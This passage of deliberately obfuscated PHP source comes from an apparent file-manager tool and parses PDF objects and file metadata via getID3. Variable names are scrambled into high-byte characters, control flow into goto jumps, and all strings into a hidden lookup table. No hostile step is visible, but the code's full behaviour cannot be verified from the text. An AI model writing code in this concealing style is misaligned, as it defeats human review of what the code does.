$EĞ¿Øñ»¶ó); $D¹¥é¯Êƒ[$BÄ®•Šø°™[1531]] = StreamWrapperIO::read($D¹¥é¯Êƒ[$BÄ®•Šø°™[75]], $D¹¥é¯Êƒ[$BÄ®•Šø°™[77]] - $EĞ¿Øñ»¶ó, $EĞ¿Øñ»¶ó); $c—‹¿Ş°Ÿ = $D¹¥é¯Êƒ[$BÄ®•Šø°™[1531]]; } $cÍİÙœğÙ” = 0; preg_match_all($BÄ®•Šø°™[1553], $c—‹¿Ş°Ÿ, $Bê‚Üù§¯ø); goto bªÊßö±; fÒÒõø¤»±: if (preg_match($BÄ®•Šø°™[1563], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[1191]] = intval($Bê‚Üù§¯ø[1]) . $BÄ®•Šø°™[70] . intval($Bê‚Üù§¯ø[2]); } if (preg_match($BÄ®•Šø°™[1564], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[367]] = array(); $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[367]][0] = $Bê‚Üù§¯ø[1]; $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[367]][1] = $Bê‚Üù§¯ø[2]; } if (!$bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[1191]]) { return !1; } goto a§Ç‹ÌáÈé; a§Ç‹ÌáÈé: if (preg_match($BÄ®•Šø°™[1565], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { } return $bÓ‚æğï“î; goto bñÀ–šÎ“; a‚‰ôØÒ˜Ø: if (preg_match($BÄ®•Šø°™[1558], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[77]] = intval($Bê‚Üù§¯ø[1]); } if (preg_match($BÄ®•Šø°™[1559], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[1560]] = intval($Bê‚Üù§¯ø[1]) . $BÄ®•Šø°™[70] . intval($Bê‚Üù§¯ø[2]); } if (preg_match($BÄ®•Šø°™[1561], $fâê‰·Åˆ, $Bê‚Üù§¯ø) > 0) { $bÓ‚æğï“î[$BÄ®•Šø°™[1532]][$BÄ®•Šø°™[1562]] = intval($Bê‚Üù§¯ø[1]) . $BÄ®•Šø°™[70] . intval($Bê‚Üù§¯ø[2]); } goto fÒÒõø¤»±; bªÊßö±: foreach ($Bê‚Üù§¯ø[3] as $aµóÀ¾†‘ => $F°×Óßø¬î) { if ($Bê‚Üù§¯ø[3][$aµóÀ¾†‘] == $BÄ®•Šø°™[1554]) { $f…¡¡˜†Œ¦ = $cÍİÙœğÙ” . $BÄ®•Šø°™[70] . intval($Bê‚Üù§¯ø[2][$aµóÀ¾†‘]); $bÓ‚æğï“î[$BÄ®•Šø°™[1551]][$f…¡¡˜†Œ¦] = intval($Bê‚Üù§¯ø[1][$aµóÀ¾†‘]); ++$cÍİÙœğÙ”; } else { if ($Bê‚Üù§¯ø[3][$aµóÀ¾†‘] == $BÄ®•Šø°™[1555]) { ++$cÍİÙœğÙ”; } else { } } } if (preg_match_all($BÄ®•Šø°™[1556], $c—‹¿Ş°Ÿ, $Bê‚Üù§¯ø)) { $eÍ°ƒÂÑ¿´ = $D¹¥é¯Êƒ[$BÄ®•Šø°™[77]] - $D¹¥é¯Êƒ[$BÄ®•Šø°™[1529]]; foreach ($Bê‚Üù§¯ø[0] as $aµóÀ¾†‘ => $a¯šĞ·¿Õ×) { $Fº¦ù…Õ†£ = $Bê‚Üù§¯ø[1][$aµóÀ¾†‘] . $BÄ®•Šø°™[70] . $Bê‚Üù§¯ø[2][$aµóÀ¾†‘]; $bÓ‚æğï“î[$BÄ®•Šø°™[1551]][$Fº¦ù…Õ†£] = strpos($c—‹¿Ş°Ÿ, $a¯šĞ·¿Õ×) + $eÍ°ƒÂÑ¿´ + 1; } } if (preg_match_all($BÄ®•Šø°™[1557], $c—‹¿Ş°Ÿ, $Bê‚Üù§¯ø)) { $fâê‰·Åˆ = count($Bê‚Üù§¯ø[1]) == 1 ? $Bê‚Üù§¯ø[1][0] : $Bê‚Üù§¯ø[1][1]; } else { $fâê‰·Åˆ = substr($c—‹¿Ş°Ÿ, -1024 * 5); } goto a‚‰ôØÒ˜Ø; bñÀ–šÎ“: } private static function getObjectValue($A¨ê‘¤Ô§¶, $cÄ™ïìø„ä, $cóÌ°º­ˆ) { goto eÉÂæ†Ş¶¦; Dê¿“½Û: return $aíŒá­¶Ç‘; goto fˆ¦¯§¸â®; eÉÂæ†Ş¶¦: $EÊâÆÄß‘± =& $_SERVER[Æ]; $dñ±ƒ¿ º = self::getObject($A¨ê‘¤Ô§¶, $cÄ™ïìø„ä[$EÊâÆÄß‘±[1551]][$cóÌ°º­ˆ]); if (is_string($dñ±ƒ¿ º[1])) { return $dñ±ƒ¿ º[1]; } goto còÓÖÈÍ‡; còÓÖÈÍ‡: if (!is_array($dñ±ƒ¿ º[1])) { return array(); } $aíŒá­¶Ç‘ = array(); for ($B®ñè©à¿î = 0; $B®ñè©à¿î < count($dñ±ƒ¿ º[1]); $B®ñè©à¿î += 2) { $bƒ£ùÑÙµÅ = $dñ±ƒ¿ º[1][$B®ñè©à¿î]; $DË©öáŸµ = $dñ±ƒ¿ º[1][$B®ñè©à¿î + 1]; if (count($bƒ£ùÑÙµÅ) == 3 && $bƒ£ùÑÙµÅ[0] == $EÊâÆÄß‘±[8]) { $CöÉÃºÎˆ˜ = !1; if ($DË©öáŸµ[0] == $EÊâÆÄß‘±[1566]) { $DË©öáŸµ = self::getObject($A¨ê‘¤Ô§¶, $cÄ™ïìø„ä[$EÊâÆÄß‘±[1551]][$DË©öáŸµ[1]]); } $CöÉÃºÎˆ˜ = $DË©öáŸµ[1]; if ($CöÉÃºÎˆ˜ === !1) { continue; } if (is_string($CöÉÃºÎˆ˜)) { $CöÉÃºÎˆ˜ = self::decodeStr($CöÉÃºÎˆ˜); } $aíŒá­¶Ç‘[$bƒ£ùÑÙµÅ[1]] = $CöÉÃºÎˆ˜; } } goto Dê¿“½Û; fˆ¦¯§¸â®: } private static function getObject($A‘œ¸êÍÁÄ, $EµßÁ×Û†») { $fš¯«ïñÒ = self::getObjectItem($A‘œ¸êÍÁÄ, $EµßÁ×Û†»); $fš¯«ïñÒ = self::getObjectItem($A‘œ¸êÍÁÄ, $fš¯«ïñÒ[2]); return $fš¯«ïñÒ; } private static function getObjectItem($a‰ƒã¬‹â, $cÑÜçÊå½) { goto A¹ÉÈ£’²; A¹ÉÈ£’²: $b¶õÖÕÖº¹ =& $_SERVER[Æ]; $cİ½­ÀµŸ” = $a‰ƒã¬‹â[$b¶õÖÕÖº¹[1529]]; $FˆãøšËº© = $a‰ƒã¬‹â[$b¶õÖÕÖº¹[77]] - $cİ½­ÀµŸ”; goto A¨ßÏ®áÛ¬; A¨ßÏ®áÛ¬: $a÷‚Ü‚­«ƒ = $cÑÜçÊå½ >= $FˆãøšËº© ? $cÑÜçÊå½ - $FˆãøšËº© : $cÑÜçÊå½; $bÇÁ²±ÄÜ® = $cÑÜçÊå½ >= $FˆãøšËº© ? $a‰ƒã¬‹â[$b¶õÖÕÖº¹[1531]] : $a‰ƒã¬‹â[$b¶õÖÕÖº¹[1530]]; if ($cÑÜçÊå½ > $cİ½­ÀµŸ” && $cÑÜçÊå½ <= $FˆãøšËº©) { $a÷‚Ü‚­«ƒ = 0; $bÇÁ²±ÄÜ® = StreamWrapperIO::read($a‰ƒã¬‹â[$b¶õÖÕÖº¹[75]], $cÑÜçÊå½, $cİ½­ÀµŸ”); } goto e¬‡ä¦¦†; e¬‡ä¦¦†: $A„ ®¬Ñ”Ü = self::getRawObject($bÇÁ²±ÄÜ®, $a÷‚Ü‚­«ƒ); if ($cÑÜçÊå½ >= $FˆãøšËº©) { $A„ ®¬Ñ”Ü[2] = $A„ ®¬Ñ”Ü[2] + $FˆãøšËº©; } else { if ($cÑÜçÊå½ > $cİ½­ÀµŸ” && $cÑÜçÊå½ <= $FˆãøšËº©) { $A„ ®¬Ñ”Ü[2] = $A„ ®¬Ñ”Ü[2] + $cÑÜçÊå½; } } return $A„ ®¬Ñ”Ü; goto cïŞãÆÚŠ; cïŞãÆÚŠ: } private static function decodeStr($A×“™˜‰›£) { goto Eˆõ¦í½ÎÈ; EØƒÈéÉË¹: $A×“™˜‰›£ = $BØ¥¿è…–‡[33]; foreach ($eÛˆÓàŠÁç as $e¤ÓÚí­Ÿ­) { if (preg_match($BØ¥¿è…–‡[1581], $e¤ÓÚí­Ÿ­) && !1 === stripos($e¤ÓÚí­Ÿ­, $BØ¥¿è…–‡[1582])) { $e¤ÓÚí­Ÿ­ = preg_replace($BØ¥¿è…–‡[1583], $BØ¥¿è…–‡[33], $e¤ÓÚí­Ÿ­); $e¤ÓÚí­Ÿ­ = trim($e¤ÓÚí­Ÿ­, $BØ¥¿è…–‡[927]); $e¤ÓÚí­Ÿ­ = pack($BØ¥¿è…–‡[1584], $e¤ÓÚí­Ÿ­); $A×“™˜‰›£ .= $e¤ÓÚí­Ÿ­; } else { $A×“™˜‰›£ .= $e¤ÓÚí­Ÿ­; } } if (preg_match($BØ¥¿è…–‡[1585], $A×“™˜‰›£)) { $cé°¶‚¥ù¥ = substr($A×“™˜‰›£, 2); $A×“™˜‰›£ = $BØ¥¿è…–‡[33]; $Fô«˜ÂÅ¯æ = strlen($cé°¶‚¥ù¥); for ($fšé»Ìåñ = 0; $fšé»Ìåñ < $Fô«˜ÂÅ¯æ; $fšé»Ìåñ += 2) { $Fá¿èÌ¡”î = hexdec(bin2hex(substr($cé°¶‚¥ù¥, $fšé»Ìåñ, 2))); $A×“™˜‰›£ .= mb_convert_encoding($BØ¥¿è…–‡[1586] . intval($Fá¿èÌ¡”î) . $BØ¥¿è…–‡[67], $BØ¥¿è…–‡[1587], $BØ¥¿è…–‡[1588]); } } goto d×º¸İÑæÛ; d×º¸İÑæÛ: return $A×“™˜‰›£; goto cƒ˜ˆç„ˆÖ; Eˆõ¦í½ÎÈ: $BØ¥¿è…–‡ =& $_SERVER[Æ]; $A×“™˜‰›£ = str_replace(array($BØ¥¿è…–‡[1567], $BØ¥¿è…–‡[1568], $BØ¥¿è…–‡[1569], $BØ¥¿è…–‡[1570], $BØ¥¿è…–‡[1571], $BØ¥¿è…–‡[1572], $BØ¥¿è…–‡[1573], $BØ¥¿è…–‡[1574]), array($BØ¥¿è…–‡[93], $BØ¥¿è…–‡[50], $BØ¥¿è…–‡[8], $BØ¥¿è…–‡[248], $BØ¥¿è…–‡[818], $BØ¥¿è…–‡[217], $BØ¥¿è…–‡[991], $BØ¥¿è…–‡[330]), $A×“™˜‰›£); $eÛˆÓàŠÁç = preg_split($BØ¥¿è…–‡[1575], $A×“™˜‰›£, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EŒ³ƒ­·Œ…; d½Šè‡Ó’: $A×“™˜‰›£ = $BØ¥¿è…–‡[33]; foreach ($eÛˆÓàŠÁç as $e¤ÓÚí­Ÿ­) { if (preg_match($BØ¥¿è…–‡[1578], $e¤ÓÚí­Ÿ­)) { $A×“™˜‰›£ .= \chr(hexdec(trim($e¤ÓÚí­Ÿ­, $BØ¥¿è…–‡[1579]))); } else { $A×“™˜‰›£ .= $e¤ÓÚí­Ÿ­; } } $eÛˆÓàŠÁç = preg_split($BØ¥¿è…–‡[1580], $A×“™˜‰›£, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EØƒÈéÉË¹; EŒ³ƒ­·Œ…: $A×“™˜‰›£ = $BØ¥¿è…–‡[33]; foreach ($eÛˆÓàŠÁç as $e¤ÓÚí­Ÿ­) { if (preg_match($BØ¥¿è…–‡[1576], $e¤ÓÚí­Ÿ­)) { $A×“™˜‰›£ .= \chr(octdec(trim($e¤ÓÚí­Ÿ­, $BØ¥¿è…–‡[93]))); } else { $A×“™˜‰›£ .= $e¤ÓÚí­Ÿ­; } } $eÛˆÓàŠÁç = preg_split($BØ¥¿è…–‡[1577], $A×“™˜‰›£, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d½Šè‡Ó’; cƒ˜ˆç„ˆÖ: } private static function getRawObject($e„â±‡åó§, $cË½†ÍˆÎŒ = 0) { goto c„äŒÍÉùÚ; d©ÀÛÒÚ±: $cË½†ÍˆÎŒ += strspn($e„â±‡åó§, $CŠ¾¡ñËíµ[1589], $cË½†ÍˆÎŒ); $fØ”¯¦ö = $e„â±‡åó§[$cË½†ÍˆÎŒ]; switch ($fØ”¯¦ö) { case $CŠ¾¡ñËíµ[1590]: $e‹†œÌ­Í… = strcspn($e„â±‡åó§, $CŠ¾¡ñËíµ[1591], $cË½†ÍˆÎŒ); if ($e‹†œÌ­Í… > 0) { $cË½†ÍˆÎŒ += $e‹†œÌ­Í…; return self::getRawObject($e„â±‡åó§, $cË½†ÍˆÎŒ); } break; case $CŠ¾¡ñËíµ[8]: $cî¼é¼°Ï± = $fØ”¯¦ö; ++$cË½†ÍˆÎŒ; $E¸§­„©‹Ü = preg_match($CŠ¾¡ñËíµ[1592], substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 256), $C¢•‘±åŠ); if (1 == $E¸§­„©‹Ü) { $aù¦‰ÕšµÛ = $C¢•‘±åŠ[1]; $cË½†ÍˆÎŒ += strlen($aù¦‰ÕšµÛ); } break; case $CŠ¾¡ñËíµ[248]: case $CŠ¾¡ñËíµ[818]: $cî¼é¼°Ï± = $fØ”¯¦ö; ++$cË½†ÍˆÎŒ; $B›ÊƒàÑÎ = $cË½†ÍˆÎŒ; if ($CŠ¾¡ñËíµ[248] == $fØ”¯¦ö) { $bÇØ²¡Õ¸ = 1; while ($bÇØ²¡Õ¸ > 0) { if (!isset($e„â±‡åó§[$B›ÊƒàÑÎ])) { break; } $Dƒ’È¡í­ = $e„â±‡åó§[$B›ÊƒàÑÎ]; switch ($Dƒ’È¡í­) { case $CŠ¾¡ñËíµ[93]: ++$B›ÊƒàÑÎ; break; case $CŠ¾¡ñËíµ[248]: ++$bÇØ²¡Õ¸; break; case $CŠ¾¡ñËíµ[818]: --$bÇØ²¡Õ¸; break; } ++$B›ÊƒàÑÎ; } $aù¦‰ÕšµÛ = substr($e„â±‡åó§, $cË½†ÍˆÎŒ, $B›ÊƒàÑÎ - $cË½†ÍˆÎŒ - 1); $cË½†ÍˆÎŒ = $B›ÊƒàÑÎ; } break; case $CŠ¾¡ñËíµ[157]: case $CŠ¾¡ñËíµ[476]: $cî¼é¼°Ï± = $fØ”¯¦ö; ++$cË½†ÍˆÎŒ; if ($CŠ¾¡ñËíµ[157] == $fØ”¯¦ö) { $aù¦‰ÕšµÛ = array(); do { $dÎØ »Ò¾¦ = $cË½†ÍˆÎŒ; $fÖèè¤¸ßÃ = self::getRawObject($e„â±‡åó§, $cË½†ÍˆÎŒ); $cË½†ÍˆÎŒ = $fÖèè¤¸ßÃ[2]; $aù¦‰ÕšµÛ[] = $fÖèè¤¸ßÃ; } while ($CŠ¾¡ñËíµ[476] != $fÖèè¤¸ßÃ[0] && $cË½†ÍˆÎŒ != $dÎØ »Ò¾¦); array_pop($aù¦‰ÕšµÛ); } break; case $CŠ¾¡ñËíµ[926]: case $CŠ¾¡ñËíµ[929]: if (isset($e„â±‡åó§[$cË½†ÍˆÎŒ + 1]) && $e„â±‡åó§[$cË½†ÍˆÎŒ + 1] == $fØ”¯¦ö) { $cî¼é¼°Ï± = $fØ”¯¦ö . $fØ”¯¦ö; $cË½†ÍˆÎŒ += 2; if ($CŠ¾¡ñËíµ[926] == $fØ”¯¦ö) { $aù¦‰ÕšµÛ = array(); do { $dÎØ »Ò¾¦ = $cË½†ÍˆÎŒ; $fÖèè¤¸ßÃ = self::getRawObject($e„â±‡åó§, $cË½†ÍˆÎŒ); $cË½†ÍˆÎŒ = $fÖèè¤¸ßÃ[2]; $aù¦‰ÕšµÛ[] = $fÖèè¤¸ßÃ; } while ($CŠ¾¡ñËíµ[1593] != $fÖèè¤¸ßÃ[0] && $cË½†ÍˆÎŒ != $dÎØ »Ò¾¦); array_pop($aù¦‰ÕšµÛ); } } else { $cî¼é¼°Ï± = $fØ”¯¦ö; ++$cË½†ÍˆÎŒ; $E¸§­„©‹Ü = preg_match($CŠ¾¡ñËíµ[1594], substr($e„â±‡åó§, $cË½†ÍˆÎŒ), $C¢•‘±åŠ); if ($CŠ¾¡ñËíµ[926] == $fØ”¯¦ö && 1 == $E¸§­„©‹Ü) { $aù¦‰ÕšµÛ = strtr($C¢•‘±åŠ[1], $CŠ¾¡ñËíµ[1595], $CŠ¾¡ñËíµ[33]); $cË½†ÍˆÎŒ += \strlen($C¢•‘±åŠ[0]); } elseif (!1 !== ($CŒ–®Á¥õ = strpos($e„â±‡åó§, $CŠ¾¡ñËíµ[929], $cË½†ÍˆÎŒ))) { $cË½†ÍˆÎŒ = $CŒ–®Á¥õ + 1; } } break; default: if ($CŠ¾¡ñËíµ[1596] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 6)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1596]; $cË½†ÍˆÎŒ += 6; } elseif ($CŠ¾¡ñËíµ[99] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 4)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[99]; $cË½†ÍˆÎŒ += 4; $aù¦‰ÕšµÛ = $CŠ¾¡ñËíµ[99]; } elseif ($CŠ¾¡ñËíµ[1597] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 4)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1598]; $cË½†ÍˆÎŒ += 4; $aù¦‰ÕšµÛ = $CŠ¾¡ñËíµ[1597]; } elseif ($CŠ¾¡ñËíµ[1599] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 5)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1598]; $cË½†ÍˆÎŒ += 5; $aù¦‰ÕšµÛ = $CŠ¾¡ñËíµ[1599]; } elseif ($CŠ¾¡ñËíµ[1600] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 6)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1600]; $cË½†ÍˆÎŒ += 6; if (1 == preg_match($CŠ¾¡ñËíµ[1601], substr($e„â±‡åó§, $cË½†ÍˆÎŒ), $C¢•‘±åŠ)) { $cË½†ÍˆÎŒ += strlen($C¢•‘±åŠ[0]); $c‹àŸ²â„† = $CŠ¾¡ñËíµ[1602]; $E¸§­„©‹Ü = preg_match($c‹àŸ²â„†, substr($e„â±‡åó§, $cË½†ÍˆÎŒ), $C¢•‘±åŠ, PREG_OFFSET_CAPTURE); if (1 == $E¸§­„©‹Ü) { $aù¦‰ÕšµÛ = substr($e„â±‡åó§, $cË½†ÍˆÎŒ, $C¢•‘±åŠ[0][1]); $cË½†ÍˆÎŒ += $C¢•‘±åŠ[1][1]; } } } elseif ($CŠ¾¡ñËíµ[1603] == substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 9)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1603]; $cË½†ÍˆÎŒ += 9; } elseif (1 == preg_match($CŠ¾¡ñËíµ[1604], substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 33), $C¢•‘±åŠ)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1566]; $cË½†ÍˆÎŒ += strlen($C¢•‘±åŠ[0]); $aù¦‰ÕšµÛ = intval($C¢•‘±åŠ[1]) . $CŠ¾¡ñËíµ[70] . intval($C¢•‘±åŠ[2]); } elseif (1 == preg_match($CŠ¾¡ñËíµ[1605], substr($e„â±‡åó§, $cË½†ÍˆÎŒ, 33), $C¢•‘±åŠ)) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1606]; $aù¦‰ÕšµÛ = intval($C¢•‘±åŠ[1]) . $CŠ¾¡ñËíµ[70] . intval($C¢•‘±åŠ[2]); $cË½†ÍˆÎŒ += strlen($C¢•‘±åŠ[0]); } elseif (($cˆ³Å¦†ÈÂ = strspn($e„â±‡åó§, $CŠ¾¡ñËíµ[1607], $cË½†ÍˆÎŒ)) > 0) { $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[1608]; $aù¦‰ÕšµÛ = substr($e„â±‡åó§, $cË½†ÍˆÎŒ, $cˆ³Å¦†ÈÂ); $cË½†ÍˆÎŒ += $cˆ³Å¦†ÈÂ; } break; } goto FôÙèîƒà; FôÙèîƒà: return array($cî¼é¼°Ï±, $aù¦‰ÕšµÛ, $cË½†ÍˆÎŒ); goto dÂ¢ÆèŠù¸; c„äŒÍÉùÚ: $CŠ¾¡ñËíµ =& $_SERVER[Æ]; $cî¼é¼°Ï± = $CŠ¾¡ñËíµ[33]; $aù¦‰ÕšµÛ = $CŠ¾¡ñËíµ[33]; goto d©ÀÛÒÚ±; dÂ¢ÆèŠù¸: } } class GetInfo { private static $fileTypeArray; public static function get($EœØ‡½¬Ê) { $aã¦±«¬†õ = IO::info($EœØ‡½¬Ê); return self::infoAdd($aã¦±«¬†õ); } public static function infoAdd(&$f¤ã¢ëˆä‹) { goto b¯½ÑÅšÇÍ; CäÙ—ù©ÂÑ: if (!$f¤ã¢ëˆä‹ || $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[29]] != $f®¯íÆ˜”µ[167]) { return; } if (!self::support($f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[160]]) || isset($f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[426]])) { return; } $aŒ­Ó¢¯Óï = $f®¯íÆ˜”µ[1610] . $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[75]]; goto Eèã¦ĞŠøò; dèò¹äİ: $Câ¤éáÒŒÖ[$f®¯íÆ˜”µ[372]] = $Fè§Ë°ˆå½; $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[426]] = $Câ¤éáÒŒÖ; return $f¤ã¢ëˆä‹; goto bƒøùİ Éø; b¯½ÑÅšÇÍ: $f®¯íÆ˜”µ =& $_SERVER[Æ]; static $eàÙÓØƒÓã; if (!$eàÙÓØƒÓã) { require SDK_DIR . $f®¯íÆ˜”µ[1609]; $eàÙÓØƒÓã = new getID3(); } goto CäÙ—ù©ÂÑ; Eèã¦ĞŠøò: $Fè§Ë°ˆå½ = $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[160]]; try { if ($f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[160]] == $f®¯íÆ˜”µ[1611]) { $Câ¤éáÒŒÖ = self::psdParse($aŒ­Ó¢¯Óï); $Fè§Ë°ˆå½ = $f®¯íÆ˜”µ[1612]; } else { if ($f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[160]] == $f®¯íÆ˜”µ[1613]) { $Câ¤éáÒŒÖ = self::pdfParse($aŒ­Ó¢¯Óï); } else { $Fè§Ë°ˆå½ = self::$fileTypeArray[$f®¯íÆ˜”µ[1614]][$f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[160]]]; $dĞ±æŒ²İ¨ = self::$fileTypeArray[$f®¯íÆ˜”µ[1615]][$Fè§Ë°ˆå½][$f®¯íÆ˜”µ[1616]]; $AÔìÄ„ìŒ = @$eàÙÓØƒÓã->analyze($aŒ­Ó¢¯Óï, $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[77]], $f¤ã¢ëˆä‹[$f®¯íÆ˜”µ[28]]); $Câ¤éáÒŒÖ = self::parseData($AÔìÄ„ìŒ, $dĞ±æŒ²İ¨, $f¤ã¢ëˆä‹); } } } catch (Exception $D„ îÇ) { $Câ¤éáÒŒÖ = array($f®¯íÆ˜”µ[372] => $Fè§Ë°ˆå½); } if (!$Câ¤éáÒŒÖ) { return; } goto dèò¹äİ; bƒøùİ Éø: } public static function support($e¸¹›ĞÉá) { goto Dª¹ó…Ïğ·; bÇ×ã°Ò›: return !1; goto C «İµé÷; E‘ƒğÂÉ: $fë„àåŞ˜ = array($câ¡„Çõ‡µ[1613], $câ¡„Çõ‡µ[1611]); if (in_array($e¸¹›ĞÉá, $fë„àåŞ˜)) { return !0; } if (isset(self::$fileTypeArray[$câ¡„Çõ‡µ[1614]][$e¸¹›ĞÉá])) { return !0; } goto bÇ×ã°Ò›; Dª¹ó…Ïğ·: $câ¡„Çõ‡µ =& $_SERVER[Æ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $e¸¹›ĞÉá = strtolower($e¸¹›ĞÉá); goto E‘ƒğÂÉ; C «İµé÷: } private static function parseData($bî®¯ô«§Ò, $C•˜–š˜á°, $C’‡ÁÑÆ) { $cˆŞá‚Ê®¢ =& $_SERVER[Æ]; $Cˆ§†‡ª‹§ = $bî®¯ô«§Ò[$cˆŞá‚Ê®¢[1617]]; $cÏ…‘¿ôğÃ = array(); foreach ($C•˜–š˜á° as $b„¦ßğÍ¤Ú => $FÃæº‰Ã–˜) { foreach ($FÃæº‰Ã–˜ as $EÉÇ‹”˜…) { if (is_array($EÉÇ‹”˜…)) { $e¢ÖĞ„±ä = self::parseData($bî®¯ô«§Ò, $FÃæº‰Ã–˜, $C’‡ÁÑÆ); if ($e¢ÖĞ„±ä) { $cÏ…‘¿ôğÃ[$b„¦ßğÍ¤Ú] = $e¢ÖĞ„±ä; } break; } $C¨–ÑÔÙƒ = str_replace($cˆŞá‚Ê®¢[1387], $Cˆ§†‡ª‹§, $EÉÇ‹”˜…); $e¢ÖĞ„±ä = _get($bî®¯ô«§Ò, $C¨–ÑÔÙƒ); $e¢ÖĞ„±ä = is_array($e¢ÖĞ„±ä) ? $e¢ÖĞ„±ä[0] : $e¢ÖĞ„±ä; if ($e¢ÖĞ„±ä) { break; } } if ($e¢ÖĞ„±ä || $e¢ÖĞ„±ä === 0 || $e¢ÖĞ„±ä === !1) { $e¢ÖĞ„±ä = self::valueReset($EÉÇ‹”˜…, $e¢ÖĞ„±ä, $b„¦ßğÍ¤Ú); if ($e¢ÖĞ„±ä !== null) { $cÏ…‘¿ôğÃ[$b„¦ßğÍ¤Ú] = $e¢ÖĞ„±ä; } } } $cÏ…‘¿ôğÃ = self::valueResetAll($cÏ…‘¿ôğÃ, $C’‡ÁÑÆ); return $cÏ…‘¿ôğÃ; } private static function psdParse($Aƒø÷¾¼¹ø) { $f”¡©Ã»¨õ =& $_SERVER[Æ]; if (IO::fileSubstr($Aƒø÷¾¼¹ø, 0, 4) != $f”¡©Ã»¨õ[1618]) { return !1; } $cÎÆ•ÉÈ´æ = getImageSize($Aƒø÷¾¼¹ø, $a´†á¢·¼ç); if (!$cÎÆ•ÉÈ´æ) { return; } $Añ§ÆÇ…í = array($f”¡©Ã»¨õ[1533] => $cÎÆ•ÉÈ´æ[0], $f”¡©Ã»¨õ[1535] => $cÎÆ•ÉÈ´æ[1]); return $Añ§ÆÇ…í; } private static function pdfParse($AÚ‡ÒÌËâ¥) { return FileParsePdf::parse($AÚ‡ÒÌËâ¥); } private static function fileTypeParse() { $b­¿®ˆäŠº =& $_SERVER[Æ]; $b¿Œ×œÏ•› = self::fileTypeArray(); $e³æÏÈ‹ŞÓ = array(); foreach ($b¿Œ×œÏ•› as $c…Ø«øØŒ¢ => $BÅ†›ğ¨íÃ) { $bóÄ´Æ¯Æ = _get($BÅ†›ğ¨íÃ, $b­¿®ˆäŠº[160], $b­¿®ˆäŠº[33]); $d¶ï™Ûùæ = is_string($bóÄ´Æ¯Æ) ? explode($b­¿®ˆäŠº[47], $bóÄ´Æ¯Æ) : $bóÄ´Æ¯Æ; if (!$d¶ï™Ûùæ) { continue; } foreach ($d¶ï™Ûùæ as $bóÄ´Æ¯Æ) { $bóÄ´Æ¯Æ = strtolower(trim($bóÄ´Æ¯Æ)); if (!$bóÄ´Æ¯Æ) { continue; } $e³æÏÈ‹ŞÓ[$bóÄ´Æ¯Æ] = $c…Ø«øØŒ¢; } $b¿Œ×œÏ•›[$c…Ø«øØŒ¢][$b­¿®ˆäŠº[160]] = array_keys($e³æÏÈ‹ŞÓ); $b¿Œ×œÏ•›[$c…Ø«øØŒ¢][$b­¿®ˆäŠº[1616]] = self::parseKeyMap($BÅ†›ğ¨íÃ[$b­¿®ˆäŠº[1616]]); } return array($b­¿®ˆäŠº[1615] => $b¿Œ×œÏ•›, $b­¿®ˆäŠº[1614] => $e³æÏÈ‹ŞÓ); } private static function parseKeyMap($e©´à¿ËÛ½) { $a‰ÊÔ×¨Åä =& $_SERVER[Æ]; foreach ($e©´à¿ËÛ½ as $F¼‘äòÖ¾ğ => $B‘ôŸŠ¡µ“) { if (is_array($B‘ôŸŠ¡µ“)) { $fÇø£ = self::parseKeyMap($B‘ôŸŠ¡µ“); if ($fÇø£) { $e©´à¿ËÛ½[$F¼‘äòÖ¾ğ] = $fÇø£; } continue; } $båË›İäÈ = explode($a‰ÊÔ×¨Åä[47], $B‘ôŸŠ¡µ“); $fÚ‡»¡À• = array(); foreach ($båË›İäÈ as $cÛ·÷ƒÛ‡¢) { $cÛ·÷ƒÛ‡¢ = trim($cÛ·÷ƒÛ‡¢); if (!$cÛ·÷ƒÛ‡¢) { continue; } if (preg_match($a‰ÊÔ×¨Åä[1619], $cÛ·÷ƒÛ‡¢, $a©¢·¶¢ëö)) { $fœ Š›¥·Ë = explode($a‰ÊÔ×¨Åä[271], $a©¢·¶¢ëö[1]); foreach ($fœ Š›¥·Ë as 